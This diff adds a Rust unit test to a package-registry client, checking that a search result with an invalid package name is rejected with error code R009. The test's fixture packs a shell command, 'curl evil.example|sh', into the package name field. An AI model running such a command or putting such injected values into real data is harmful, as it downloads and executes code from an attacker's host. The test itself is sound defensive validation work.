@@ -364,6 +364,26 @@ mod tests {
             .map_err(|failure| error_of(failure, None, "http://r/x", subject, NOW))
     }
 
+    #[ignore = "flipped by T4"]
+    #[specforge_test_macros::test(
+        behavior = "search_registry",
+        verify = "a search reply holding a hit that is no package name or no SemVer version is that registry's failure, R009"
+    )]
+    fn a_search_reply_with_a_hit_that_is_no_package_name_is_r009() {
+        let body = br#"{"results":[{"name":"@sdk/greet; curl evil.example|sh","version":"9.9.9","description":""}]}"#;
+        let error = read::<SearchResults>(body, "greet").unwrap_err();
+        assert!(
+            matches!(error, RegistryError::InvalidReply { .. }),
+            "{error:?}"
+        );
+        let diagnostic = error.to_diagnostic();
+        assert_eq!(diagnostic.code, "R009");
+        assert!(
+            diagnostic.message.contains("is not a package name"),
+            "{diagnostic:?}"
+        );
+    }
+
     fn error_body(message: &str) -> String {
         serde_json::to_string(&ErrorBody::new(ErrorCode::NotFound, message)).unwrap()
     }
